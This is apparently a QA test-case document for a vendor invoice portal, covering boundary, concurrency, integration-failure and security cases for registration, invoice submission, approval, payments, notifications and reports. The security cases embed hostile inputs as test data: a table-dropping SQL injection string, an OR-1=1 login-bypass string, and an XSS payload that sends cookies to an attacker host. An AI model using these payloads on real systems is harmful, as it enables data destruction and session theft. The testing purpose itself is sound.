# Detailed Test Cases — Extreme & Edge Cases
## Vendor Invoice Management Portal (VIMP)

**Document Type:** Test Cases — Extreme, Edge, Boundary & Negative Scenarios  
**Module:** VIMP — Vendor Invoice Management Portal  
**Prepared by:** QA Engineer  
**Date:** 2026-06-06  
**Version:** 1.0  
**PRD Reference:** `02_prd.md` | **Test Plan Reference:** `04_test_plan.md`

> This document covers **extreme, boundary, negative, concurrency, security, and integration-failure** scenarios that stress the system beyond normal usage. Standard happy-path cases are in `04_test_plan.md`. Every case here follows QA Excellence Slide 16 criteria: specific test data, single expected result, atomic, reproducible, traces to requirement, covers failure paths.

---

## How to Read This Document

Each test case uses the following structure:

| Field | Description |
|-------|-------------|
| **TC-ID** | `TC-EX-NNN` — unique ID (EX = extreme/edge) |
| **Type** | B = Boundary · N = Negative · S = Security · C = Concurrency · E = Edge · P = Performance |
| **Layer** | UI / API / DB / INT (Integration) |
| **Priority** | P1 = Block release · P2 = Before release · P3 = Regression |
| **Precondition** | Exact state required before test starts |
| **Test Data** | Exact values to use — no ambiguity |
| **Steps** | Numbered, reproducible by any tester |
| **Expected Result** | What must be true across UI, API, and DB |

---

## Module 1 — Authentication & Registration: Extreme Cases

---

### TC-EX-001 — Unicode Characters in All Registration Fields

| Field | Value |
|-------|-------|
| Type | E |
| Layer | UI + API + DB |
| Priority | P2 |
| Story | US-VIMP-001 |

**Precondition:** Registration page open. No prior account for the test email.

**Test Data:**
- Company Name: `测试供应商 Pty Ltd` (Chinese + Latin mix)
- Contact Name: `Ärjän Müller` (German diacritics)
- Email: `unicode_vendor@testco.com`
- Password: `Secure@123`
- Tax ID: `GSTIN-TEST-001`

**Steps:**
1. Navigate to `/register`
2. Enter Company Name = `测试供应商 Pty Ltd`
3. Enter Contact Name = `Ärjän Müller`
4. Enter Email = `unicode_vendor@testco.com`
5. Enter Password = `Secure@123`
6. Click Register

**Expected Result:**
- **UI:** Registration success message shown; no garbled characters displayed
- **API:** HTTP 201; response body contains company name exactly as entered (UTF-8 preserved)
- **DB:** `vendor` record stores company name and contact name in UTF-8; no encoding corruption; `SELECT company_name FROM vendors WHERE email='unicode_vendor@testco.com'` returns `测试供应商 Pty Ltd`

---

### TC-EX-002 — Maximum Length Email Address (254 Characters)

| Field | Value |
|-------|-------|
| Type | B |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-001 |

**Precondition:** Registration page open. RFC 5321 permits max 254-character email.

**Test Data:**
- Email: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com`
  *(localpart 100 chars + @ + domain 152 chars + .com = 254 total)*
- All other fields: valid

**Steps:**
1. Enter the 254-char email into the email field
2. Complete all other mandatory fields
3. Submit registration

**Expected Result:**
- **UI:** Registration accepted (254 chars is within RFC limit)
- **API:** HTTP 201; account created
- **DB:** Full email stored without truncation; `LENGTH(email)` = 254

---

### TC-EX-003 — Email Address at 255 Characters (Over RFC Limit)

| Field | Value |
|-------|-------|
| Type | B |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-001 |

**Precondition:** Registration page open.

**Test Data:**
- Email: Same as TC-EX-002 but with one extra character in localpart (255 chars total)

**Steps:**
1. Paste the 255-char email into the email field
2. Complete other fields
3. Submit

**Expected Result:**
- **UI:** Inline error "Please enter a valid email address." (RFC 5321 violation)
- **API:** HTTP 422; no account created
- **DB:** No record inserted

---

### TC-EX-004 — Email with Plus Addressing (Subaddress)

| Field | Value |
|-------|-------|
| Type | E |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-001 |

**Precondition:** No account exists for this email.

**Test Data:** Email = `vendor+invoices@testco.com`

**Steps:**
1. Register with email `vendor+invoices@testco.com`
2. Complete all fields and submit

**Expected Result:**
- **UI/API:** Registration accepted — plus addressing is valid per RFC 5321
- **DB:** Email stored exactly as `vendor+invoices@testco.com`
- Verification email sent to `vendor+invoices@testco.com`
- Login later with `vendor+invoices@testco.com` must succeed

---

### TC-EX-005 — Simultaneous Registration with Same Email (Race Condition)

| Field | Value |
|-------|-------|
| Type | C |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-001 |

**Precondition:** No account exists for `race_test@testco.com`. Two API clients ready.

**Test Data:** Both clients register with identical payload — email: `race_test@testco.com`

**Steps:**
1. Fire two simultaneous POST `/api/register` requests with the same email, within the same millisecond window (use a load testing tool or two threads)
2. Capture both HTTP responses

**Expected Result:**
- **API:** Exactly one response is HTTP 201 (success); the other is HTTP 409 "Account with this email already exists"
- **DB:** Exactly ONE vendor record with `email='race_test@testco.com'` — no duplicates; UNIQUE constraint enforced at DB level
- No data corruption; `SELECT COUNT(*) FROM vendors WHERE email='race_test@testco.com'` = 1

---

### TC-EX-006 — Verification Link Used Twice

| Field | Value |
|-------|-------|
| Type | S + E |
| Layer | UI + DB |
| Priority | P1 |
| Story | US-VIMP-001, AC-VIMP-001b |

**Precondition:** Account in `PENDING_VERIFICATION`; verification email received.

**Test Data:** Valid verification link from the email

**Steps:**
1. Click verification link → account becomes `ACTIVE`
2. Copy the same verification link URL
3. Visit the same link again in a new browser tab

**Expected Result:**
- **First click:** Account activated; redirect to login with "Email verified" message
- **Second click:** Error page or message: "This verification link has already been used or has expired." Account remains `ACTIVE` (no regression)
- **DB:** Verification token marked as `used = true` or deleted after first use; cannot be reused
- **Security:** Link cannot be used to repeatedly activate new accounts; one-time-use enforced

---

### TC-EX-007 — Login: Token Replay After Logout

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-002 |

**Precondition:** Active vendor account; vendor logs in and obtains session JWT.

**Test Data:** Captured JWT token value

**Steps:**
1. Login as vendor → capture JWT token from response/cookie
2. Make an authenticated request to `/api/invoices` — confirm it works (HTTP 200)
3. Call `POST /api/auth/logout`
4. Using the same captured JWT token, make another request to `/api/invoices`

**Expected Result:**
- **Step 2:** HTTP 200 — valid session
- **Step 3:** HTTP 200 — logout successful; server-side session invalidated
- **Step 4:** HTTP 401 — token is revoked/invalid post-logout; no data returned
- **DB/Cache:** Session/token entry is removed or flagged as revoked on logout

---

### TC-EX-008 — Password Reset While Session Is Active

| Field | Value |
|-------|-------|
| Type | S + E |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-002 |

**Precondition:** Vendor has two active sessions (two browsers). Vendor initiates password reset.

**Test Data:** Active account; two open sessions

**Steps:**
1. Login as vendor in Browser A → note session token A
2. Login as vendor in Browser B → note session token B
3. Complete password reset flow (request reset email, set new password)
4. Using old token A, make request to `/api/invoices`
5. Using old token B, make request to `/api/invoices`

**Expected Result:**
- **Steps 4 & 5:** Both old tokens return HTTP 401 — password change must invalidate ALL existing sessions
- Vendor must log in again with new password
- **DB:** All sessions for this user are invalidated on password change

---

### TC-EX-009 — Login Attempt After Account Locked: Even with Correct Password

| Field | Value |
|-------|-------|
| Type | N + B |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-002, AC-VIMP-002d |

**Precondition:** Account `locked_vendor@testco.com` has been locked after 5 failed attempts.

**Test Data:** Email: `locked_vendor@testco.com`, Password: `CorrectPass@1` (the actual correct password)

**Steps:**
1. Attempt login with the correct password on the locked account

**Expected Result:**
- **UI/API:** HTTP 401: "Your account is locked. A reset link has been sent to your email." — login does NOT succeed even with correct credentials
- The lock is not bypassed by providing the correct password
- **DB:** `failed_attempts = 5`, `locked_at` still set, `status = LOCKED`

---

### TC-EX-010 — Session Cookie: HttpOnly and Secure Flags

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-002, AC-VIMP-002a |

**Precondition:** Vendor logs in on a staging environment with HTTPS.

**Steps:**
1. Login as vendor
2. Inspect the Set-Cookie header in the login response (use browser devtools or Burp Suite)
3. Check cookie flags

**Expected Result:**
- Session cookie has `HttpOnly` flag set → JavaScript cannot access it via `document.cookie`
- Session cookie has `Secure` flag set → cookie only sent over HTTPS
- Session cookie has `SameSite=Strict` or `SameSite=Lax` → mitigates CSRF
- Cookie does not include `Expires` set to a far future date (session cookie only)

---

## Module 2 — Invoice Submission: Extreme Cases

---

### TC-EX-020 — Invoice Number with Maximum Length

| Field | Value |
|-------|-------|
| Type | B |
| Layer | UI + DB |
| Priority | P2 |
| Story | US-VIMP-005 |

**Precondition:** Active vendor logged in; open PO assigned to vendor.

**Test Data:** Invoice Number = 50 characters: `INV-ABCDEFGHIJKLMNOPQRSTUVWXYZ-12345678901234` (50 chars)

**Steps:**
1. Open invoice submission form
2. Enter a 50-character invoice number (at system limit, assumed)
3. Complete remaining fields
4. Submit

**Expected Result:**
- Invoice accepted; stored with full 50-char invoice number without truncation
- **DB:** `LENGTH(invoice_number)` = 50

---

### TC-EX-021 — Invoice Number Exceeds Maximum Length (51 chars)

| Field | Value |
|-------|-------|
| Type | B |
| Layer | UI |
| Priority | P2 |
| Story | US-VIMP-005 |

**Test Data:** Invoice Number = 51 characters (one over limit)

**Steps:**
1. Attempt to type 51 characters into the invoice number field

**Expected Result:**
- Field enforces `maxlength = 50`; 51st character is not accepted
- No server-side validation needed (client blocks it at character 51)

---

### TC-EX-022 — Invoice Number with Special Characters

| Field | Value |
|-------|-------|
| Type | E + S |
| Layer | UI + API + DB |
| Priority | P2 |
| Story | US-VIMP-005 |

**Test Data:** Invoice Number = `INV/2024\001` (forward slash, backslash); second test: `INV-2024'; DROP TABLE invoices;--`

**Steps:**
1. Submit invoice with `INV/2024\001` as invoice number
2. Submit invoice with SQLi payload as invoice number

**Expected Result:**
- **Test 1:** Either accepted (slash/backslash allowed) and stored correctly, or rejected with "Invoice number contains invalid characters" — must be consistent with documented allowed character set
- **Test 2:** SQLi payload stored as literal string (parameterised queries used); no SQL execution; no DB error; invoice number appears as the literal string when retrieved

---

### TC-EX-023 — Zero-Byte File Upload

| Field | Value |
|-------|-------|
| Type | B + N |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-006 |

**Test Data:** A 0-byte file named `empty.pdf`

**Steps:**
1. Create an empty file (0 bytes) named `empty.pdf`
2. Attach it to the invoice submission form
3. Attempt submission

**Expected Result:**
- **UI/API:** Error: "The attached file is empty. Please upload a valid document."
- **DB/Storage:** File is NOT stored; no zero-byte record created

---

### TC-EX-024 — Corrupt/Damaged PDF Upload

| Field | Value |
|-------|-------|
| Type | N |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-006 |

**Test Data:** A binary file with `.pdf` extension but corrupt/invalid PDF header (first bytes are not `%PDF`)

**Steps:**
1. Create or obtain a corrupt PDF (e.g., truncated mid-stream)
2. Upload as invoice attachment

**Expected Result:**
- **API:** Server-side validation detects invalid PDF structure; error: "File appears to be corrupt or invalid. Please re-upload."
- File not stored in the system
- No unhandled exception or 500 error

---

### TC-EX-025 — Password-Protected PDF Upload

| Field | Value |
|-------|-------|
| Type | E |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-006 |

**Test Data:** A valid PDF with password protection set to `password123`

**Steps:**
1. Upload a password-protected PDF as invoice attachment
2. Submit the invoice

**Expected Result:**
- Defined behaviour must be one of:
  - (a) Rejected: "Password-protected PDFs are not accepted. Please remove the password and resubmit."
  - (b) Accepted: Stored as-is (AP team handles opening)
- Either outcome is acceptable IF documented; the test verifies the system behaves consistently with the stated policy
- System must NOT crash or return 500

---

### TC-EX-026 — File with Double Extension (invoice.pdf.exe)

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-006 |

**Test Data:** A file named `invoice.pdf.exe` (executable renamed with double extension)

**Steps:**
1. Attempt to upload `invoice.pdf.exe` via the file picker
2. If client-side check passes, submit the form

**Expected Result:**
- **UI:** Client-side validation rejects the file based on final extension `.exe`: "Unsupported file format."
- **API:** If client check is bypassed (direct API call), server-side MIME type + extension inspection rejects it
- No executable is stored in the system

---

### TC-EX-027 — PO Closed Between Form Load and Submission

| Field | Value |
|-------|-------|
| Type | C + E |
| Layer | API + DB |
| Priority | P1 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Precondition:** Vendor loads the invoice submission form with PO-VIMP-500 shown as "Open".

**Steps:**
1. Vendor opens invoice submission form; PO-VIMP-500 is shown as Open
2. **Concurrently:** AP Admin closes PO-VIMP-500 (marks it as CLOSED in the system)
3. Vendor completes the form (references PO-VIMP-500) and clicks Submit

**Expected Result:**
- **API:** Submission rejected with error: "PO-VIMP-500 is no longer open and cannot accept new invoices."
- **DB:** No invoice record created against the closed PO
- The system validates PO status at the time of submission, not at the time of form load

---

### TC-EX-028 — Invoice Amount with Excessive Decimal Places

| Field | Value |
|-------|-------|
| Type | B + N |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-005 |

**Test Data:** Amount = `50000.999` (3 decimal places); second: `50000.9999` (4 decimal places)

**Steps:**
1. Enter `50000.999` in the amount field
2. Submit invoice
3. Repeat with `50000.9999`

**Expected Result:**
- **3 decimal places:** Either rejected ("Currency amounts support up to 2 decimal places") or rounded to `50001.00` — behaviour must be consistent with documented rounding policy
- **4 decimal places:** Rejected; standard financial precision is 2 decimal places
- **DB:** Amount stored must not have more decimal precision than the currency supports

---

### TC-EX-029 — Invoice Amount = Maximum Possible Value

| Field | Value |
|-------|-------|
| Type | B |
| Layer | UI + API + DB |
| Priority | P2 |
| Story | US-VIMP-005 |

**Test Data:** Amount = `999,999,999.99` (assuming DECIMAL(12,2) or similar)

**Steps:**
1. Enter `999999999.99` in the amount field
2. Submit invoice with all other fields valid

**Expected Result:**
- **UI/API:** Invoice accepted if within system's defined maximum (to be confirmed per OQ)
- **DB:** Amount stored correctly as `999999999.99` — no overflow, no rounding error

---

### TC-EX-030 — 50 Invoices Submitted Simultaneously by Same Vendor

| Field | Value |
|-------|-------|
| Type | C + P |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-005 |

**Precondition:** 50 distinct invoice numbers and PO numbers prepared. Vendor auth token obtained.

**Test Data:** INV-BULK-001 through INV-BULK-050; PO-BULK-001 through PO-BULK-050

**Steps:**
1. Fire 50 simultaneous POST `/api/invoices` requests using 50 different invoice payloads
2. Capture all 50 HTTP responses

**Expected Result:**
- All 50 invoices created successfully (if no rate limiting configured)
- OR: System enforces rate limiting and returns HTTP 429 after threshold; remaining invoices queued or rejected with clear error
- **DB:** Exactly 50 invoice records (no partial states, no duplicates)
- No 500 errors; system remains stable and responsive after the burst

---

### TC-EX-031 — Same Invoice Number Used by Two Different Vendors

| Field | Value |
|-------|-------|
| Type | E |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-005, BR-VIMP-011 |

**Precondition:** Vendor A has submitted `INV-SHARED-001` against PO-A-100. Vendor B has a separate PO-B-200.

**Test Data:**
- Vendor A: `INV-SHARED-001` against `PO-A-100` (already submitted)
- Vendor B: `INV-SHARED-001` against `PO-B-200`

**Steps:**
1. Verify Vendor A's submission exists
2. Login as Vendor B
3. Submit `INV-SHARED-001` against `PO-B-200`

**Expected Result:**
- **Vendor B's submission succeeds** — because duplicate detection is per vendor (BR-VIMP-011: same invoice number + same PO + same vendor = duplicate); a different vendor using the same invoice number is NOT a duplicate
- **DB:** Two records exist: one for Vendor A + PO-A-100 + INV-SHARED-001 and one for Vendor B + PO-B-200 + INV-SHARED-001

---

### TC-EX-032 — Invoice Referencing PO That Belongs to the Same Company but Different Branch

| Field | Value |
|-------|-------|
| Type | E |
| Layer | API |
| Priority | P2 |
| Story | US-VIMP-005, BR-VIMP-001 |

**Precondition:** Vendor "TechCorp Main" and "TechCorp North Branch" are different registered vendors but same company group. PO-NB-100 is assigned to TechCorp North Branch.

**Test Data:** TechCorp Main vendor token; PO-NB-100

**Steps:**
1. Login as TechCorp Main
2. Submit invoice referencing PO-NB-100

**Expected Result:**
- **API:** HTTP 422 — "PO-NB-100 is not assigned to your account." (Error does not confirm that PO exists for another vendor)
- Different vendor registrations are isolated regardless of company relationship

---

### TC-EX-033 — Upload: Valid PDF with Embedded JavaScript

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API + Storage |
| Priority | P1 |
| Story | US-VIMP-006 |

**Test Data:** A valid PDF file containing embedded JavaScript actions (PDF supports JavaScript via `/JS` or `/JavaScript` actions)

**Steps:**
1. Create or obtain a PDF with embedded JavaScript (`app.alert("XSS")`)
2. Upload as invoice attachment

**Expected Result:**
- **Option A (Strict):** Server-side PDF sanitisation strips embedded scripts before storage; the stored PDF does not execute scripts when opened
- **Option B (Permissive, documented):** File accepted as-is but PDF viewer in portal renders it in a sandboxed iframe that disables JavaScript execution
- Either way: no script executes in the portal context; no XSS via PDF

---

### TC-EX-034 — Invoice Form: Line Item Description Contains Executable Payload

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI + DB |
| Priority | P1 |
| Story | US-VIMP-005 |

**Test Data:** Line item description = `<img src=x onerror=fetch('https://attacker.com?cookie='+document.cookie)>`

**Steps:**
1. Enter the XSS payload into a line item description field
2. Submit the invoice
3. Login as AP User and view the invoice in the AP approval queue

**Expected Result:**
- **Stored value:** HTML-encoded in DB; displayed as literal text in all views
- **AP User view:** No script executes; no cookie theft; text appears as literal HTML characters
- Both vendor and AP views must HTML-escape all stored text before rendering

---

## Module 3 — AP Approval & Rejection: Extreme Cases

---

### TC-EX-040 — AP Approval Queue with 10,000 Pending Invoices

| Field | Value |
|-------|-------|
| Type | P + E |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-009 |

**Precondition:** Staging DB seeded with 10,000 invoices in `SUBMITTED` status.

**Steps:**
1. Login as AP User
2. Navigate to the Approval Queue
3. Observe page load time and behaviour
4. Apply a filter (by vendor name or date)
5. Navigate to page 2 of results

**Expected Result:**
- Page loads within 3 seconds (paginated, not loading all 10,000 at once)
- Pagination works correctly (e.g., 50 items per page × 200 pages)
- Filter reduces results correctly (no full-scan without index)
- Total count displayed accurately
- **API:** GET `/api/invoices/pending` with `?page=2&limit=50` returns correct page; no timeout

---

### TC-EX-041 — AP User's Browser Tab Becomes Stale (Race Condition)

| Field | Value |
|-------|-------|
| Type | C + E |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-010 |

**Precondition:** AP User has invoice `INV-STALE-001` open in Tab A. Another AP User approves the same invoice in Tab B.

**Steps:**
1. AP User 1 opens `INV-STALE-001` in Tab A — status shows SUBMITTED
2. AP User 2 approves `INV-STALE-001` in Tab B — status changes to APPROVED
3. AP User 1 clicks Approve in Tab A (stale view)

**Expected Result:**
- **Tab A after click:** Error returned from server: "This invoice has already been actioned by another user. Please refresh."
- UI refreshes automatically or prompts user to refresh
- Invoice status shows APPROVED (not double-approved)
- **DB:** Single approval audit trail entry; `approved_by` = User 2 (the actual approver)

---

### TC-EX-042 — Approve Invoice While Network Drops Mid-Request

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | UI + API + DB |
| Priority | P1 |
| Story | US-VIMP-010, AC-VIMP-004h |

**Precondition:** AP User viewing invoice `INV-NET-001` in SUBMITTED status.

**Steps:**
1. AP User clicks Approve
2. Simulate network drop exactly after the browser sends the request but before the server response is received (use network throttling/proxy)
3. Observe invoice state
4. Reconnect network
5. Refresh the page

**Expected Result:**
- **During outage:** UI shows loading state; no partial state
- **After reconnect + refresh:** Invoice is in one of two states:
  - `APPROVED` (if server processed the request before network drop) — correct; no re-approval needed
  - `SUBMITTED` (if request was not received) — correct; AP User can approve again
- Under NO circumstances is the invoice in an undefined intermediate state (e.g., `null` status or `APPROVING`)

---

### TC-EX-043 — Bulk Approval: Approve 100 Invoices Simultaneously

| Field | Value |
|-------|-------|
| Type | P + E |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-010 |

**Precondition:** 100 invoices in SUBMITTED status. Bulk approval feature exists (if applicable per OQ-05).

**Steps:**
1. Select all 100 invoices in the AP queue
2. Click "Approve All" (if feature exists) OR fire 100 simultaneous POST `/api/invoices/{id}/approve` requests

**Expected Result:**
- All 100 invoices transition to APPROVED without data corruption
- Exactly 100 audit trail entries created
- Payment forwarding triggered for all 100
- No 500 errors; system handles the burst gracefully
- If processed sequentially under the hood: no deadlock or timeout

---

### TC-EX-044 — Rejection Reason Contains Unicode and Emoji

| Field | Value |
|-------|-------|
| Type | E |
| Layer | UI + API + DB |
| Priority | P3 |
| Story | US-VIMP-011 |

**Test Data:** Rejection reason = `PO値が不一致です。❌ Please resubmit with correct PO.`

**Steps:**
1. Reject invoice with the above reason
2. Check vendor's email notification
3. Check portal view of rejection reason

**Expected Result:**
- Reason stored with full Unicode and emoji preserved (UTF-8 storage)
- Vendor email renders Unicode and emoji correctly
- Portal view renders correctly without garbling
- Emoji counted within the character limit (emoji = 1-4 bytes but should count as 1 character visually)

---

### TC-EX-045 — Attempt to Reject Invoice Using GET Instead of POST (HTTP Verb Tampering)

| Field | Value |
|-------|-------|
| Type | S |
| Layer | API |
| Priority | P1 |
| Story | US-VIMP-011 |

**Steps:**
1. Craft a GET request to `/api/invoices/INV-TEST-001/reject`
2. Send with a valid AP User auth token and rejection reason in query param

**Expected Result:**
- HTTP 405 Method Not Allowed
- Invoice status unchanged
- State-changing operations must only accept POST/PATCH/PUT — GET must never trigger state changes

---

### TC-EX-046 — AP Admin Deletes Their Own Account (Last Admin Scenario)

| Field | Value |
|-------|-------|
| Type | E |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-019 |

**Precondition:** There is exactly one AP Admin account in the system. That AP Admin is logged in.

**Steps:**
1. System Admin deactivates the only AP Admin account
   — OR —
2. AP Admin attempts to deactivate their own account via the user management panel

**Expected Result:**
- System should prevent deactivation of the last AP Admin: "Cannot deactivate the only active AP Admin. Please assign another AP Admin first."
- If a System Admin performs the deactivation, same guard should apply
- **Guard prevents:** Scenario where no one can approve invoices (system deadlock)

---

### TC-EX-047 — Filter AP Queue by Invoice Number Containing SQLi

| Field | Value |
|-------|-------|
| Type | S |
| Layer | UI + API |
| Priority | P1 |
| Story | US-VIMP-009 |

**Test Data:** Search/filter input = `' OR '1'='1`

**Steps:**
1. Login as AP User
2. Type `' OR '1'='1` into the invoice search/filter field
3. Submit the search

**Expected Result:**
- Search returns results matching the literal string `' OR '1'='1` (which is zero results)
- The full invoice database is NOT returned (SQLi not executed)
- No SQL error message exposed
- Parameterised queries used throughout

---

## Module 4 — Payment Forwarding: Extreme Cases

---

### TC-EX-060 — Payment System Returns 200 but Malformed JSON

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | INT + API |
| Priority | P1 |
| Story | US-VIMP-013, AC-VIMP-006c |

**Precondition:** Invoice `INV-PAY-001` approved. Payment system mock configured to return HTTP 200 with body: `{"payment_ref": null, "scheduled`: (malformed — truncated JSON)

**Steps:**
1. Approve invoice
2. Monitor payment forwarding call
3. Check invoice status after forwarding attempt

**Expected Result:**
- System detects malformed response (JSON parse error)
- Invoice status set to `PENDING_PAYMENT_FORWARDING` (not PAYMENT_INITIATED)
- Error logged: "Payment system returned 200 but response body was malformed: [parse error detail]"
- AP Admin alerted
- System does NOT assume success just because HTTP 200 was returned

---

### TC-EX-061 — Payment System Returns Duplicate Payment Reference

| Field | Value |
|-------|-------|
| Type | E |
| Layer | INT + DB |
| Priority | P1 |
| Story | US-VIMP-013 |

**Precondition:** Two different invoices approved (INV-A-001 and INV-B-001). Payment system mock returns the same `payment_ref: "PAY-88001"` for both.

**Steps:**
1. Approve INV-A-001 → payment ref PAY-88001 stored
2. Approve INV-B-001 → payment system again returns PAY-88001

**Expected Result:**
- **DB:** Alert or error logged: "Duplicate payment reference PAY-88001 received for invoice INV-B-001. INV-A-001 already holds this reference."
- AP Admin alerted
- System must not silently overwrite the existing payment reference
- This is a payment system bug that VIMP must surface, not hide

---

### TC-EX-062 — Payment Forwarding Timeout (>30 Seconds)

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | INT |
| Priority | P1 |
| Story | US-VIMP-013, AC-VIMP-006b |

**Precondition:** Payment system mock configured with 35-second response delay.

**Steps:**
1. Approve invoice
2. Monitor forwarding call — it hangs for 35 seconds
3. Check invoice status after timeout

**Expected Result:**
- System has a configured timeout (e.g., 30 seconds) on payment API calls
- After timeout: invoice placed in retry queue; status = `PENDING_PAYMENT_FORWARDING`
- **No duplicate call sent** before the first has definitively failed (idempotency key prevents duplicate payment)
- AP Admin alerted after retry exhaustion
- System does not block other operations while waiting for this timeout

---

### TC-EX-063 — Multiple Approved Invoices for Same Vendor in Same Second

| Field | Value |
|-------|-------|
| Type | C + E |
| Layer | API + INT |
| Priority | P2 |
| Story | US-VIMP-013 |

**Precondition:** 5 invoices from Vendor X all approved simultaneously (bulk approval scenario).

**Steps:**
1. Approve 5 invoices from Vendor X simultaneously
2. Monitor 5 payment forwarding calls

**Expected Result:**
- All 5 forwarding calls succeed independently
- Each with a unique idempotency key
- No payment consolidation (each invoice forwarded separately unless batching is documented behaviour)
- 5 separate `PAYMENT_INITIATED` status updates in DB
- Vendor receives 5 separate "payment initiated" email notifications

---

## Module 5 — Notifications: Extreme Cases

---

### TC-EX-070 — Notification Triggered but Email Service Rate-Limits (HTTP 429)

| Field | Value |
|-------|-------|
| Type | N + E |
| Layer | INT |
| Priority | P2 |
| Story | US-VIMP-015 |

**Precondition:** 100 invoices approved simultaneously; email service mock returns HTTP 429 after the 50th notification.

**Steps:**
1. Approve 100 invoices simultaneously
2. Email service returns 429 for notifications 51–100

**Expected Result:**
- First 50 notifications sent successfully
- Notifications 51–100 queued for retry with exponential backoff
- After backoff, remaining notifications are sent
- No notification permanently lost
- All 100 vendors eventually receive their approval email

---

### TC-EX-071 — Notification Email Subject Contains Invoice Number with Special Characters

| Field | Value |
|-------|-------|
| Type | E |
| Layer | INT |
| Priority | P3 |
| Story | US-VIMP-015 |

**Test Data:** Invoice number = `INV-2024/Q1&Part=2` (contains `/`, `&`, `=`)

**Steps:**
1. Submit and approve invoice with number `INV-2024/Q1&Part=2`
2. Check the generated notification email subject line

**Expected Result:**
- Email subject: "Invoice INV-2024/Q1&Part=2 Approved" — characters not HTML-encoded in subject (plain text)
- OR: Characters properly handled so subject line is not truncated or broken
- Portal deeplink in email body URL-encodes special characters correctly: `INV-2024%2FQ1%26Part%3D2`

---

### TC-EX-072 — AP Admin's Email Address Changes While Notifications Are Queued

| Field | Value |
|-------|-------|
| Type | E |
| Layer | INT + DB |
| Priority | P2 |
| Story | US-VIMP-016 |

**Precondition:** Notification to AP Admin queued but not yet sent. System Admin changes AP Admin's email address.

**Steps:**
1. Trigger a notification to AP Admin (e.g., new invoice submitted)
2. Before the notification is dispatched (within queue delay), change AP Admin's email
3. Allow notification to be sent

**Expected Result:**
- System fetches recipient email at time of dispatch (not at time of queueing)
- Notification goes to the NEW email address
- Old email address does not receive notification
- Log entry: "Notification to AP Admin dispatched to [new_email] (email updated since queueing)"

---

## Module 6 — Monthly Reports: Extreme Cases

---

### TC-EX-080 — Report Requested for a Future Month

| Field | Value |
|-------|-------|
| Type | N |
| Layer | UI + API |
| Priority | P2 |
| Story | US-VIMP-017 |

**Test Data:** Request report for month = next month (e.g., July 2026 when current date is June 2026)

**Steps:**
1. Login as AP Admin
2. Navigate to Reports
3. Select "July 2026" from the month picker
4. Click Generate / View Report

**Expected Result:**
- Error or informational message: "Reports can only be generated for completed months. July 2026 data is not yet available."
- OR: If partial-month reports are supported, clearly labelled "Partial Month (In Progress)"
- No empty report silently returned as if July data is complete

---

### TC-EX-081 — Report Generated While Month Boundary Is Crossing (Midnight Dec 31)

| Field | Value |
|-------|-------|
| Type | C + B |
| Layer | API + DB |
| Priority | P2 |
| Story | US-VIMP-017, AC-VIMP-008b |

**Precondition:** Report generation job scheduled; invoice submitted at 2026-12-31 23:59:58.

**Steps:**
1. Seed invoice submitted at `2026-12-31 23:59:58 UTC`
2. Trigger December 2026 report generation at `2026-12-31 23:59:59 UTC` (just before month boundary)
3. Seed invoice submitted at `2027-01-01 00:00:01 UTC`
4. Run the report again

**Expected Result:**
- **Run 1 (Dec 31):** Invoice from 23:59:58 is included in December report
- **Run 2 (re-run after Jan 1):** Invoice from 23:59:58 still in December; 00:00:01 invoice is NOT in December
- Report uses UTC timestamps consistently — no local timezone ambiguity
- Boundary is `>= 2026-12-01 00:00:00 UTC` AND `<= 2026-12-31 23:59:59 UTC`

---

### TC-EX-082 — Report Generation During Daylight Saving Time Change

| Field | Value |
|-------|-------|
| Type | E |
| Layer | API + DB |
| Priority | P3 |
| Story | US-VIMP-017 |

**Precondition:** System stores timestamps in UTC. Report period crosses a DST change date (e.g., UK: last Sunday of March clocks go forward 1 hour).

**Steps:**
1. Seed invoices across the DST change date for the test timezone
2. Generate monthly report for the affected month
3. Verify invoice counts

**Expected Result:**
- All invoices counted correctly regardless of DST
- The "missing hour" (clocks skip 02:00 → 03:00) does not cause invoices to be lost from the report
- UTC storage eliminates ambiguity — DST only affects display, not storage or aggregation

---

### TC-EX-083 — Two Admins Download the Same Report Simultaneously

| Field | Value |
|-------|-------|
| Type | C |
| Layer | UI + API |
| Priority | P3 |
| Story | US-VIMP-017 |

**Steps:**
1. AP Admin 1 and AP Admin 2 both click "Download May 2026 report as PDF" simultaneously

**Expected Result:**
- Both downloads complete successfully
- Both receive identical PDF files (same content, same figures)
- No file corruption; no partial download
- Report generation is idempotent — second simultaneous request returns the cached/stored report, not a race-generated duplicate

---

## Module 7 — Role-Based Access Control: Extreme Cases

---

